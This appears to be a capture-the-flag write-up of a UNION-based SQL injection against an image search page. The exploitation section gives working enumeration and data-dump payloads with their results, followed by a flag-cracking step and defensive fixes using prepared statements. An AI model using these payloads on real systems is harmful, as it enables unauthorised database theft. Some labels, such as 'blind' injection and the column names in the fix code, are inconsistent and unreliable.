# Union-Based SQL Injection Vulnerability (Image Search)

## 🎯 Overview
This vulnerability demonstrates a UNION-based SQL injection attack in the image search functionality, allowing extraction of sensitive information through SQL query manipulation without error messages.

## 🔍 Vulnerability Details
- **Endpoint**: `/index.php?page=searchimg`
- **Attack Vector**: SQL Injection via image search
- **Database Name**: Member_images
- **Vulnerable Table**: list_images
- **Attack Type**: Blind SQL Injection with UNION

## ⚔️ Exploitation Process

### 1. Database Enumeration
```sql
# Get database name
1 union all select 1,database()
Result: Member_images
```

### 2. Table Discovery
```sql
# Enumerate tables
1 union all select 1,group_concat(table_name) 
from Information_schema.tables 
where table_schema=database()
Result: list_images
```

### 3. Column Enumeration
```sql
# Get column names (hex-encoded table name to avoid issues)
1 union all select 1,group_concat(column_name) 
from Information_schema.columns 
where table_name=0x6c6973745f696d61676573
Result: id,url,title,comment
```

### 4. Data Extraction
```sql
# Extract comments containing the encrypted flag
1 union all select 1,group_concat(comment,0x0a) 
from list_images
Result: "If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"
```

### 5. Flag Decryption Process
1. MD5 Hash: `1928e8083cf461a51303633093573c46`
2. Decrypted: `albatroz`
3. SHA256:
```bash
echo -n albatroz | shasum -a 256
```

### Attack Result
**Flag**: f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

## 🛡️ Security Issues Identified
1. No input validation
2. No prepared statements
3. Weak password storage
4. Insufficient access controls
5. Vulnerable query structure

## 🔒 Recommended Security Fixes

### 1. Implement Prepared Statements
```php
# Use PDO with prepared statements
public function searchImage($term) {
    $stmt = $this->db->prepare("
        SELECT title, url 
        FROM list_images 
        WHERE title LIKE :term 
        OR description LIKE :term
    ");
    $stmt->execute(['term' => "%{$term}%"]);
    return $stmt->fetchAll();
}
```

### 2. Input Validation
```php
function sanitizeSearchTerm($input) {
    // Remove special characters
    $clean = preg_replace('/[^a-zA-Z0-9\s-]/', '', $input);
    // Limit length
    return substr($clean, 0, 50);
}
```

### 3. Query Structure
```php
class ImageSearch {
    private $allowedColumns = ['title', 'description', 'category'];
    
    public function buildQuery($searchTerm, $column = 'title') {
        if (!in_array($column, $this->allowedColumns)) {
            throw new InvalidArgumentException('Invalid column');
        }
        
        $stmt = $this->db->prepare("
            SELECT id, title, url 
            FROM list_images 
            WHERE {$column} LIKE :term
        ");
        return $stmt;
    }
}
```

### 4. Security Measures Checklist
- [ ] Implement prepared statements
- [ ] Add input validation
- [ ] Use parameterized queries
- [ ] Limit query results
- [ ] Implement proper error handling
- [ ] Add query timeouts
- [ ] Use secure password storage

## 📝 Best Practices

### Query Security
1. Use parameterized queries
2. Validate and sanitize all inputs
3. Implement proper error handling
4. Use least privilege database users
5. Regular security audits

### Database Configuration
```php
// Secure database configuration
$config = [
    'DB_USER' => 'limited_user',
    'DB_CHARSET' => 'utf8mb4',
    'DB_OPTIONS' => [
        PDO::ATTR_EMULATE_PREPARES => false,
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
    ]
];
```

## 📚 Additional Resources
- [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [MySQL Security Best Practices](https://dev.mysql.com/doc/refman/8.0/en/security-best-practices.html)
- [PHP Database Security](https://www.php.net/manual/en/security.database.sql-injection.php)

## ⚠️ Disclaimer
This documentation is for educational purposes only. Always obtain proper authorization before testing security measures on any system.